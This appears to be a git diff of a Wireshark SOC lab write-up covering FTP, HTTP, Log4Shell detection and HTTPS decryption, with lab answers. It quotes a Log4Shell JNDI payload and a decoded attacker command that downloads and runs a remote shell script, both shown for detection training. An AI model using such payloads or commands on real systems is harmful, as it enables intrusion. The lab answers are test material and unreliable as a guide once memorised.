@@ -544,10 +544,7 @@ DNS replies:  142.x.x.x
 
 **Malicious DNS**  malware encodes stolen data inside the subdomain:
 
-Malicious query: YWJjMTIz.dataexfil.com
-                 ^^^^^^^^
-                 This random string IS the stolen data
-
+Malicious query: YWJjMTIz(This random string IS the stolen data).dataexfil.com
 
 **Indicators:**
 - Unusually long DNS query names
@@ -729,11 +726,17 @@ ftp.request.arg == "password123"
 ### Investigation Workflow
 
 **Step 1:** Show FTP traffic → ftp
+
 **Step 2:** Look for failed logins → ftp.response.code == 530
+
 **Step 3:** Look for successful login → ftp.response.code == 230
+
 **Step 4:** Find username → ftp.request.command == "USER"
+
 **Step 5:** Find password → ftp.request.command == "PASS"
+
 **Step 6:** Inspect commands (LIST, CWD, STOR, RETR, DELE, CHMOD)
+
 **Step 7:** Determine what was uploaded, downloaded, deleted, or permission-changed
 
 ---
@@ -745,7 +748,7 @@ ftp.request.arg == "password123"
 Filter: `ftp.response.code == 530`
 
 <div align="center">
-  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q1(3).PNG?raw=true">
+  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Capture16(2).PNG?raw=true">
 </div> 
 
 
@@ -756,27 +759,40 @@ Answer: 737
 Filter: `ftp.response.code == 213`
 
 <div align="center">
-  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q1(3).PNG?raw=true">
+  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Capture17(2).PNG?raw=true">
 </div> 
 
-Answer: `39424`
+Answer: 39424
 
-**Q: What is the filename the adversary downloaded?**
+**Q3: What is the filename the adversary downloaded?**
+
 Filter: `ftp.request.command == "RETR"`
-Answer: `resume.doc`
 
-**Q: What is the command used by the adversary to change file permissions?**
+<div align="center">
+  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Capture18.PNG?raw=true">
+</div> 
+
+Answer: resume.doc
+
+**Q4: What is the command used by the adversary to change file permissions?**
+
 Filter: `ftp contains "CHMOD"`
-Answer: `SITE CHMOD 777 resume.doc`
+
+<div align="center">
+  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Capture19(1).PNG?raw=true">
+</div> 
+
+Answer: SITE CHMOD 777 resume.doc
 
 ---
 
 ## 6. HTTP Analysis
 
-### 🎯 Objective
-Analyze HTTP traffic to detect phishing, web attacks, data exfiltration, C2 communication, suspicious user agents, and exploitation attempts (e.g., Log4Shell).
+### Objective
 
-> ⚠️ **Key idea:** HTTP is **plaintext** — URLs, headers, cookies, forms, and request details are all fully visible in Wireshark.
+Analyze HTTP traffic to detect phishing, web attacks, data exfiltration, C2 communication, suspicious user agents, and exploitation attempts (Log4Shell).
+
+ HTTP is **plaintext** URLs, headers, cookies, forms, and request details are all fully visible in Wireshark.
 
 ### HTTP vs HTTPS
 
@@ -793,9 +809,9 @@ Analyze HTTP traffic to detect phishing, web attacks, data exfiltration, C2 comm
 
 | Method | Purpose | Filter |
 |--------|---------|--------|
-| GET | Request data from server | `http.request.method == "GET"` |
-| POST | Send data to server (forms, file uploads, APIs) | `http.request.method == "POST"` |
-| All requests | Show all HTTP requests | `http.request` |
+| GET | Request data from server | http.request.method == "GET" |
+| POST | Send data to server (forms, file uploads, APIs) | http.request.method == "POST" |
+| All requests | Show all HTTP requests | http.request |
 
 ---
 
@@ -805,7 +821,7 @@ Analyze HTTP traffic to detect phishing, web attacks, data exfiltration, C2 comm
 
 | Code | Meaning | Filter |
 |------|---------|--------|
-| 200 | OK | `http.response.code == 200` |
+| 200 | OK | http.response.code == 200 |
 
 **Redirection:**
 
@@ -818,10 +834,10 @@ Analyze HTTP traffic to detect phishing, web attacks, data exfiltration, C2 comm
 
 | Code | Meaning | Filter |
 |------|---------|--------|
-| 400 | Bad Request | `http.response.code == 400` |
-| 401 | Unauthorized | `http.response.code == 401` |
-| 403 | Forbidden | `http.response.code == 403` |
-| 404 | Not Found | `http.response.code == 404` |
+| 400 | Bad Request | http.response.code == 400 |
+| 401 | Unauthorized | http.response.code == 401 |
+| 403 | Forbidden | http.response.code == 403 |
+| 404 | Not Found | http.response.code == 404 |
 | 405 | Method Not Allowed | — |
 | 408 | Request Timeout | — |
 
@@ -830,7 +846,7 @@ Analyze HTTP traffic to detect phishing, web attacks, data exfiltration, C2 comm
 | Code | Meaning | Filter |
 |------|---------|--------|
 | 500 | Internal Server Error | — |
-| 503 | Service Unavailable | `http.response.code == 503` |
+| 503 | Service Unavailable | http.response.code == 503 |
 
 ---
 
@@ -838,13 +854,13 @@ Analyze HTTP traffic to detect phishing, web attacks, data exfiltration, C2 comm
 
 | Field | Purpose | Filter |
 |-------|---------|--------|
-| User-Agent | Identifies browser/tool making the request | `http.user_agent` |
-| Host | Requested domain | `http.host == "example.com"` |
-| Request URI | Requested path | `http.request.uri contains "admin"` |
-| Full URI | Complete URL | `http.request.full_uri contains "admin"` |
-| Server header | Web server software | `http.server contains "Apache"` |
-| Connection | Keep-Alive status | `http.connection == "Keep-Alive"` |
-| Plaintext search | Search inside HTTP response content | `data-text-lines contains "password"` |
+| User-Agent | Identifies browser/tool making the request | http.user_agent |
+| Host | Requested domain | http.host == "example.com" |
+| Request URI | Requested path | http.request.uri contains "admin" |
+| Full URI | Complete URL | http.request.full_uri contains "admin" |
+| Server header | Web server software | http.server contains "Apache" |
+| Connection | Keep-Alive status | http.connection == "Keep-Alive" |
+| Plaintext search | Search inside HTTP response content | data-text-lines contains "password" |
 
 ---
 
@@ -852,22 +868,19 @@ Analyze HTTP traffic to detect phishing, web attacks, data exfiltration, C2 comm
 
 The User-Agent field identifies what made the HTTP request. Legitimate examples:
 
-```
-Mozilla/5.0
-Chrome
-Firefox
-Edge
-Safari
-```
+-Mozilla/5.0
+-Chrome
+-Firefox
+-Edge
+-Safari
 
 Attackers often forget to hide their tools. Suspicious examples:
 
-```
-Nmap
-Nikto
-sqlmap
-Wfuzz
-```
+-Nmap
+-Nikto
+-sqlmap
+-Wfuzz
+
 
 **Detection filter for scanning tools:**
 ```
@@ -879,105 +892,140 @@ Wfuzz
 
 **Signs of a suspicious User-Agent:**
 - Different User-Agent values from the same host in a short period
-- Typographical mistakes (`Mozlila`, `Mozlilla`)
-- Scanner tool names (`sqlmap`, `Nikto`, `Nmap`)
+- Typographical mistakes (Mozlila, Mozlilla)
+- Scanner tool names (sqlmap, Nikto, Nmap)
 - Random or encoded payloads
 
-> ⚠️ **Important Rule:** Never trust a User-Agent alone. It is **completely controlled by the client** and trivially spoofed. Treat it as **one indicator**, not proof.
+Never trust a User-Agent alone. It is **completely controlled by the client** and trivially spoofed. Treat it as **one indicator**, not proof.
 
 ---
 
 ### Log4Shell (Log4j) Detection
 
-The **Log4Shell** vulnerability (CVE-2021-44228) exploited applications using Log4j by injecting malicious JNDI strings into HTTP headers such as `User-Agent` or `X-Forwarded-For`.
+The **Log4Shell** vulnerability (CVE-2021-44228) exploited applications using Log4j by injecting malicious JNDI strings into HTTP headers such as "User-Agent" or "X-Forwarded-For".
 
 **Common indicators:**
-- POST requests with `jndi:ldap` in headers
-- `Exploit.class` in the payload
-- Payloads like: `${jndi:ldap://attacker.com/...}`
+- POST requests with "jndi:ldap" in headers
+- "Exploit.class" in the payload
+- Payloads like: "${jndi:ldap://attacker.com/...}"
 
 **Detection Filters:**
 
 | Purpose | Filter |
 |---------|--------|
-| Filter POST requests | `http.request.method == "POST"` |
-| Search for JNDI payload | `frame contains "jndi"` or `ip contains "jndi"` |
-| Search for Exploit class | `frame contains "Exploit"` |
-| Suspicious User-Agent | `(http.user_agent contains "$") \|\| (http.user_agent contains "==")` |
+| Filter POST requests | http.request.method == "POST" |
+| Search for JNDI payload | frame contains "jndi" or ip contains "jndi" |
+| Search for Exploit class | frame contains "Exploit" |
+| Suspicious User-Agent | (http.user_agent contains "$") \|\| (http.user_agent contains "==") |
 
 ---
 
-### Key Wireshark Filters — HTTP Summary
+### Key Wireshark HTTP Filters 
 
 | Purpose | Filter |
 |---------|--------|
-| All HTTP traffic | `http` |
-| HTTP/2 traffic | `http2` |
-| GET requests | `http.request.method == "GET"` |
-| POST requests | `http.request.method == "POST"` |
-| All requests | `http.request` |
-| 200 OK | `http.response.code == 200` |
-| 401 Unauthorized | `http.response.code == 401` |
-| 403 Forbidden | `http.response.code == 403` |
-| 404 Not Found | `http.response.code == 404` |
-| Specific host | `http.host == "example.com"` |
-| URI contains path | `http.request.uri contains "admin"` |
-| Apache server | `http.server contains "Apache"` |
-| Search plaintext | `data-text-lines contains "password"` |
-| User-Agent: Nmap | `http.user_agent contains "Nmap"` |
-| Log4Shell payload | `frame contains "jndi"` |
+| All HTTP traffic | http |
+| HTTP/2 traffic | http2 |
+| GET requests | http.request.method == "GET" |
+| POST requests | http.request.method == "POST" |
+| All requests | http.request |
+| 200 OK | http.response.code == 200 |
+| 401 Unauthorized | http.response.code == 401 |
+| 403 Forbidden | http.response.code == 403 |
+| 404 Not Found | http.response.code == 404 |
+| Specific host | http.host == "example.com" |
+| URI contains path | http.request.uri contains "admin" |
+| Apache server | http.server contains "Apache" |
+| Search plaintext | data-text-lines contains "password" |
+| User-Agent: Nmap | http.user_agent contains "Nmap" |
+| Log4Shell payload | frame contains "jndi" |
 
 ---
 
 ### Investigation Workflow
 
-**Step 1:** Show HTTP traffic → `http`
-**Step 2:** Identify request types → `http.request`
-**Step 3:** Review response codes → `http.response.code == 404`
-**Step 4:** Inspect Host → `http.host`
-**Step 5:** Inspect URI → `http.request.uri`
-**Step 6:** Inspect User-Agent → `http.user_agent`
-**Step 7:** Search for attack patterns → `frame contains "jndi"`
+**Step 1:** Show HTTP traffic → http
+
+**Step 2:** Identify request types → http.request
+
+**Step 3:** Review response codes → http.response.code == 404
+
+**Step 4:** Inspect Host → http.host
+
+**Step 5:** Inspect URI → http.request.uri
+
+**Step 6:** Inspect User-Agent → http.user_agent
+
+**Step 7:** Search for attack patterns → frame contains "jndi"
+
 **Step 8:** Follow the TCP Stream to read the full HTTP conversation
 
 ---
 
-### 🧪 Lab Exercises
+### Lab Exercises
 
-**Q: What is the number of anomalous "user-agent" types?**
+**Q1: What is the number of anomalous "user-agent" types?**
+
 Filter: `http.user_agent`
 
 The 6 user agents found (anomalous ones highlighted):
-1. `Mozilla/5.0 (Windows; U; Windows NT 6.4...)` — legitimate browser
-2. `Mozilla/5.0 (compatible; Nmap Scripting Engine...)` — 🚩 Nmap
-3. `Wfuzz/2.4` — 🚩 fuzzing tool
-4. `sqlmap/1.4#stable` — 🚩 SQL injection tool
-5. `${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/...}` — 🚩 Log4Shell payload
-6. `Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0)` — legitimate browser
+1. Mozilla/5.0 (Windows; U; Windows NT 6.4...): legitimate browser
+2. Mozilla/5.0 (compatible; Nmap Scripting Engine...): Nmap
+3. Wfuzz/2.4: fuzzing tool
+4. sqlmap/1.4#stable: SQL injection tool
+5. ${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/...}: Log4Shell payload
+6. Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0): legitimate browser
 
-Answer: `6`
 
-**Q: What is the packet number with a subtle spelling difference in the user agent field?**
-Filter: `http.user_agent` → look for `Mozlila` (misspelling of `Mozilla`)
-Answer: `52`
+<div align="center">
+  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q1(4).PNG?raw=true">
+</div> 
 
-**Q: What is the packet number of the Log4j attack starting phase?**
+**Q2: What is the packet number with a subtle spelling difference in the user agent field?**
+
+Filter: `http.user_agent` : misspelling of `Mozilla`, (`Mozlila` )
+
+<div align="center">
+  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q2(2).PNG?raw=true">
+</div> 
+
+Answer: 52
+
+**Q3: What is the packet number of the Log4j attack starting phase?**
+
 Filter: `(ip contains "jndi") or (ip contains "Exploit")`
-Answer: `444`
 
-**Q: What is the IP address contacted by the adversary via Log4Shell? (defanged)**
-From packet 444, extract and decode the Base64 payload in the User-Agent using CyberChef → From Base64.
+<div align="center">
+  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q3(2).PNG?raw=true">
+</div> 
+
+Answer: 444
+
+**Q4: What is the IP address contacted by the adversary via Log4Shell? (defanged)**
+
+From packet 444, i extracted and decoded the Base64 payload in the User-Agent using CyberChef → From Base64.
+
+<div align="center">
+  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q4.PNG?raw=true">
+</div> 
+
 The decoded command contains: `wget http://62.210.130.250/lh.sh;chmod +x lh.sh;./lh.sh`
-Answer: `62[.]210[.]130[.]250`
+
+<div align="center">
+  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q5(2).PNG?raw=true">
+</div> 
+
+Answer: 62[.]210[.]130[.]250
 
 ---
 
 ## 7. Decrypting HTTPS Traffic
 
-### 🎯 Objective
+### Objective
+
 Learn how to identify HTTPS traffic, understand the TLS handshake, decrypt HTTPS using an SSL/TLS Key Log File, and analyze decrypted HTTP/2 traffic.
 
-> ⚠️ **Key idea:** HTTPS traffic is encrypted. Wireshark **cannot decrypt it** unless it has the correct TLS session keys.
+HTTPS traffic is encrypted. Wireshark **cannot decrypt it** unless it has the correct TLS session keys.
 
 ### What is HTTPS?
 
@@ -985,25 +1033,18 @@ HTTPS = HTTP + **TLS (Transport Layer Security)**
 
 Unlike HTTP, HTTPS encrypts: URLs (after handshake), Headers, Cookies, Forms, Passwords, Files, HTTP payload.
 
-### HTTP vs HTTPS
-
-| Property | HTTP | HTTPS |
-|----------|------|-------|
-| Port | 80 | 443 |
-| Content | Plaintext | Encrypted (TLS) |
-| Readable in Wireshark | Yes | Only after decryption |
-| Analysis | Direct | Requires TLS key log |
-
 ---
 
 ### TLS Handshake
 
 Before encryption begins, the client and server negotiate session parameters:
 
-**Step 1 — Client Hello** (`tls.handshake.type == 1`)
+**Step 1: Client Hello** (`tls.handshake.type == 1`)
+
 Contains: TLS version, supported cipher suites, random value, extensions, **SNI (Server Name Indication = requested hostname)**
 
-**Step 2 — Server Hello** (`tls.handshake.type == 2`)
+**Step 2: Server Hello** (`tls.handshake.type == 2`)
+
 Contains: Selected cipher suite, certificate, server random
 
 After the handshake, all data is encrypted.
@@ -1012,13 +1053,13 @@ After the handshake, all data is encrypted.
 
 | Purpose | Filter |
 |---------|--------|
-| All TLS/HTTPS traffic | `tls` |
-| Client Hello | `tls.handshake.type == 1` |
-| Server Hello | `tls.handshake.type == 2` |
-| Client Hello (no SSDP noise) | `(http.request or tls.handshake.type == 1) and !(ssdp)` |
-| Server Hello (no SSDP noise) | `(http.request or tls.handshake.type == 2) and !(ssdp)` |
-| Exclude SSDP | `!(ssdp)` |
-| Find SNI (requested hostname) | `tls.handshake.extensions_server_name` |
+| All TLS/HTTPS traffic | tls |
+| Client Hello | tls.handshake.type == 1 |
+| Server Hello | tls.handshake.type == 2 |
+| Client Hello (no SSDP noise) | (http.request or tls.handshake.type == 1) and !(ssdp) |
+| Server Hello (no SSDP noise) | (http.request or tls.handshake.type == 2) and !(ssdp) |
+| Exclude SSDP | !(ssdp) |
+| Find SNI (requested hostname) | tls.handshake.extensions_server_name |
 
 ---
 
@@ -1031,10 +1072,7 @@ Format:
 CLIENT_RANDOM <random> <session key>
 ```
 
-> ⚠️ **Important Rule:** The key log file **must be generated while traffic is being captured**. You **cannot recreate** session keys afterward.
-
-**Supported browsers:** Chrome, Firefox
-**Environment variable to set:** `SSLKEYLOGFILE`
+The key log file **must be generated while traffic is being captured**. **cannot recreate** session keys afterward.
 
 ---
 
@@ -1054,7 +1092,7 @@ Wireshark immediately decrypts all matching TLS sessions.
 | State | Visible | Hidden |
 |-------|---------|--------|
 | **Before** | TCP, TLS, Client Hello, Server Hello | HTTP, URLs, Cookies, Headers, Data |
-| **After** | HTTP/2, Headers, URLs, Cookies, Requests, Responses, Payload | Nothing — everything is now readable |
+| **After** | HTTP/2, Headers, URLs, Cookies, Requests, Responses, Payload | Everything is now readable |
 
 **New packet sections visible after decryption:**
 ```
@@ -1070,155 +1108,201 @@ Modern HTTPS websites use HTTP/2 rather than HTTP/1.1. Benefits: faster, multipl
 Filter: `http2`
 
 **After decryption, inspect these HTTP/2 fields:**
-- `:authority` — the destination domain
-- `:path` — the requested path
-- `:method` — GET, POST, etc.
+- `:authority` : the destination domain
+- `:path` : the requested path
+- `:method` : GET, POST, etc.
 - Cookies
 - User-Agent
 - HTTP/2 stream data
 
 ---
 
-### Key Wireshark Filters — HTTPS/TLS Summary
+### Key Wireshark HTTPS/TLS Filters
 
 | Purpose | Filter |
 |---------|--------|
-| TLS traffic | `tls` |
-| Client Hello | `tls.handshake.type == 1` |
-| Server Hello | `tls.handshake.type == 2` |
-| HTTP requests (post-decryption) | `http.request` |
-| HTTP/2 packets | `http2` |
-| Exclude SSDP | `!(ssdp)` |
-| Client Hello (clean) | `(http.request or tls.handshake.type == 1) and !(ssdp)` |
-| Server Hello (clean) | `(http.request or tls.handshake.type == 2) and !(ssdp)` |
+| TLS traffic | tls |
+| Client Hello | tls.handshake.type == 1 |
+| Server Hello | tls.handshake.type == 2 |
+| HTTP requests (post-decryption) | http.request |
+| HTTP/2 packets | http2` |
+| Exclude SSDP | !(ssdp) |
+| Client Hello (clean) | (http.request or tls.handshake.type == 1) and !(ssdp) |
+| Server Hello (clean) | (http.request or tls.handshake.type == 2) and !(ssdp) |
 
----
-
-### Practical Investigation Tips
-
-- Start with **Client Hello** to identify which domains users contacted (via the SNI extension)
-- Load the **SSLKEYLOGFILE** as early as possible in the analysis
-- After decryption, inspect `:authority`, `:path`, `:method`, Cookies, User-Agent, and HTTP/2 streams
-- If traffic remains encrypted after loading the key log, verify: the key log matches the same capture session, it was generated during the session, and the browser supports `SSLKEYLOGFILE`
 
 ---
 
 ### Investigation Workflow
 
 **Step 1:** Show TLS traffic → `tls`
+
 **Step 2:** Find Client Hello → `tls.handshake.type == 1`
+
 **Step 3:** Find Server Hello → `tls.handshake.type == 2`
+
 **Step 4:** Load Key Log File → `Edit → Preferences → Protocols → TLS → KeysLogFile.txt`
+
 **Step 5:** Traffic becomes decrypted
+
 **Step 6:** Filter HTTP/2 → `http2`
+
 **Step 7:** Inspect headers, authority, URI, cookies, payload
 
 ---
 
-### 🧪 Lab Exercises
+### Lab Exercises
 
-**Q: What is the frame number of the "Client Hello" message sent to "accounts.google.com"?**
+**Q1: What is the frame number of the "Client Hello" message sent to "accounts.google.com"?**
+
 Filter: `(http.request or tls.handshake.type == 1) and !(ssdp)`
+
 Then check the SNI field in each Client Hello for `accounts.google.com`
-Answer: `16`
 
-**Q: After loading KeysLogFile.txt, what is the number of HTTP/2 packets?**
-Navigation: `Edit → Preferences → Protocols → TLS → browse to KeysLogFile.txt`
+<div align="center">
+  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q1(5).PNG?raw=true">
+</div> 
+
+Answer: 16
+
+**Q2: After loading KeysLogFile.txt, what is the number of HTTP/2 packets?**
+
+Navigation: Edit → Preferences → Protocols → TLS → browse to KeysLogFile.txt
+
+
+<div align="center">
+  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q2(3).PNG?raw=true">
+</div> 
+
 Filter: `http2`
-Answer: `115`
 
-**Q: Go to Frame 322. What is the authority header of the HTTP/2 packet? (defanged)**
-Filter: `http2` → navigate to frame 322 → expand HTTP/2 headers → find `:authority`
+<div align="center">
+  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q3(3).PNG?raw=true">
+</div> 
+
+Answer: 115
+
+**Q3: Go to Frame 322. What is the authority header of the HTTP/2 packet? (defanged)**
+
+Filter: `http2` → i navigated to frame 322 → expanded HTTP/2 headers → found `:authority`
+
+<div align="center">
+  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q4(1).PNG?raw=true">
+</div> 
+
 Then defang using CyberChef → **Defang URL**
-Answer: `safebrowsing[.]googleapis[.]com`
 
-**Q: Investigate the decrypted packets and find the flag. What is the flag?**
-Filter: `http` → look through HTTP responses for text/plain content containing a flag
-Answer: `FLAG{THM-PACKETMASTER}`
+<div align="center">
+  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q5(3).PNG?raw=true">
+</div> 
+
+Answer: safebrowsing[.]googleapis[.]com
+
+**Q4: Investigate the decrypted packets and find the flag. What is the flag?**
+
+Filter: `http` → I looked through HTTP responses for text/plain content containing a flag
+
+<div align="center">
+  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q6.PNG?raw=true">
+</div> 
+
+Answer: FLAG{THM-PACKETMASTER}
 
 ---
 
 ## 8. Bonus Tasks
 
-### Task 9 — Hunt Cleartext Credentials (Bonus-exercise.pcap)
+### Hunt Cleartext Credentials (Bonus-exercise.pcap)
 
-**Q: What is the packet number of the credentials using "HTTP Basic Auth"?**
+**Q1: What is the packet number of the credentials using "HTTP Basic Auth"?**
 
 HTTP Basic Auth credentials appear in the `Authorization` header in plaintext (base64 encoded but not encrypted).
-Look for `Authorization: Basic` in HTTP packets.
-Answer: `237`
 
-**Q: What is the packet number where an "empty password" was submitted?**
+I looked for `Authorization: Basic` in HTTP packets.
+
+<div align="center">
+  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q1(6).PNG?raw=true">
+</div> 
+
+Answer: 237
+
+**Q2: What is the packet number where an "empty password" was submitted?**
+
 Filter: `ftp.request.command == "PASS"`
-Look for a PASS command with no argument value.
-Answer: `170`
+
+I looked for a PASS command with no argument value.
+
+<div align="center">
+  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q2(4).PNG?raw=true">
+</div> 
+
+Answer: 170
 
 ---
 
-### Task 10 — Actionable Results (Bonus-exercise.pcap)
+### Actionable Results (Bonus-exercise.pcap)
 
 Wireshark can automatically generate firewall rules from captured packets via `Tools → Firewall ACL Rules`.
 
-**Q: Select packet 99. Create an IPFirewall (ipfw) rule. What is the rule for "denying source IPv4 address"?**
+**Q1: Select packet 99. Create an IPFirewall (ipfw) rule. What is the rule for "denying source IPv4 address"?**
+
 Navigation: Select packet 99 → `Tools → Firewall ACL Rules → IPFirewall (ipfw) → Inbound + Deny`
-Answer: `add deny ip from 10.121.70.151 to any in`
 
-**Q: Select packet 231. Create an IPFirewall rule. What is the rule for "allowing destination MAC address"?**
+<div align="center">
+  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q1(7).PNG?raw=true">
+</div>
+
+<div align="center">
+  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q2(5).PNG?raw=true">
+</div>
+
+
+Answer: add deny ip from 10.121.70.151 to any in
+
+**Q2: Select packet 231. Create an IPFirewall rule. What is the rule for "allowing destination MAC address"?**
+
 Navigation: Select packet 231 → `Tools → Firewall ACL Rules → IPFirewall (ipfw) → Inbound + Allow`
-Answer: `add allow MAC 00:d0:59:aa:af:80 any in`
 
+<div align="center">
+  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q3(4).PNG?raw=true">
+</div>
+
+Answer: add allow MAC 00:d0:59:aa:af:80 any in
 ---
 
-## 📚 Key Takeaways
+## Key Takeaways
 
 **Nmap Detection**
 - Window size is the key differentiator: `> 1024` = TCP Connect, `≤ 1024` = TCP SYN
 - ICMP Type 3 Code 3 floods = UDP scan
-- Reconnaissance always precedes an attack — detect it early
 
 **ARP / MITM**
-- `arp.duplicate-address-detected` is your fastest path to finding an attacker's MAC
-- Once you have the attacker's MAC, pivot to `eth.addr == attacker_mac` for everything they touched
+- `arp.duplicate-address-detected` is the fastest path to finding an attacker's MAC
+- Once we have the attacker's MAC, pivot to `eth.addr == attacker_mac` for everything they touched
 
 **Host Identification**
 - DHCP = MAC → Hostname → IP (best source for device identity)
 - NBNS = Windows device names
 - Kerberos = usernames (`CNameString` without `$`) and computers (`CNameString` with `$`)
-- Correlate all three to fully map an environment
 
 **Tunnelling**
-- ICMP and DNS are trusted — attackers hide C2 traffic inside them
+- ICMP and DNS are trusted, attackers hide C2 traffic inside them
 - Anomalies live in packet size, frequency, and payload content, not the protocol itself
-- `data.len > 64` for ICMP and `dns.qry.name.len > 15` for DNS are your starting filters
+- Started with `data.len > 64` for ICMP and `dns.qry.name.len > 15` for DNS 
 
 **FTP**
-- Everything is plaintext — credentials, filenames, commands
+- Everything is plaintext: credentials, filenames, commands
 - `530` = failed login (brute force), `230` = success, `213` = file size, `RETR` = download, `STOR` = upload
 - CHMOD after file upload = likely persistence or privilege escalation setup
 
 **HTTP**
-- User-Agent is your first anomaly indicator but never your only one
+- User-Agent is the first anomaly indicator but never the only one
 - Log4Shell lives in HTTP headers — `frame contains "jndi"` finds it instantly
 - POST to unusual paths + `${jndi:...}` User-Agent = confirmed exploitation attempt
 
 **HTTPS Decryption**
-- No key log file = no decryption (this is by design)
+- No key log file = no decryption
 - Key log must be captured **during** the session
 - After loading the key, `http2` and `:authority` fields unlock the full picture
-
----
-
-## 🛠️ Tools Used
-
-| Tool | Purpose |
-|------|---------|
-| Wireshark | Primary analysis tool — all filtering, statistics, stream following |
-| CyberChef | Base64 decoding, IP defanging, payload analysis |
-| Exercise.pcapng | Main lab capture file |
-| icmp-tunnel.pcap | ICMP tunnelling lab |
-| dns.pcap | DNS tunnelling lab |
-| ftp.pcap | FTP analysis lab |
-| Bonus-exercise.pcap | Cleartext credentials and firewall rules bonus tasks |
-| KeysLogFile.txt | TLS session keys for HTTPS decryption |
 
 ---
